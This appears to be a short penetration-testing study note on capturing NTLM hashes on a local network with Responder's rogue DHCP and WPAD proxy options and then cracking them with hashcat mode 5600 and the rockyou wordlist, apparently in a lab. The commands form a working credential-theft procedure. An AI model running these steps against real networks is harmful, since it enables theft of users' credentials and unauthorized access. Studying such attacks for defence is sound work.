## Capturing Hashes with Responder
### Command
- `sudo responder -I eth0 -dwv` or `sudo responder -I eth0 -dPv`
- `d` is for DHCP, as we're going to be responding to DHCP broadcast request
- `w` is for wpad, which starts a WPAD rogue proxy server
- WPAD allows a browser to automatically discover a proxy without needing additional configurations
- Clients are able to locate the URL configuration file using DHCP or DNS discovery
- `P` is for proxy authentication, so we can force authentication for the proxy
- `v` is to show all hashes, even if previously captured

### Attack
- Run responder
- Use victim account to attempt to navigate to `\\10.0.2.7` in file explorer
- Responder collects hashes
- Copy a hash and paste it into a file
- Check modules for NTLM `hashcat --help | grep NTLM` and we'll use 5600
- Crack the hash `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

  ![image](https://github.com/user-attachments/assets/4ddd925d-7ff8-432a-b2c9-60df2e88bc1e)

- Best to crack hashes on metal with graphics card
- Can use other wordlists or rule sets to mutate the list
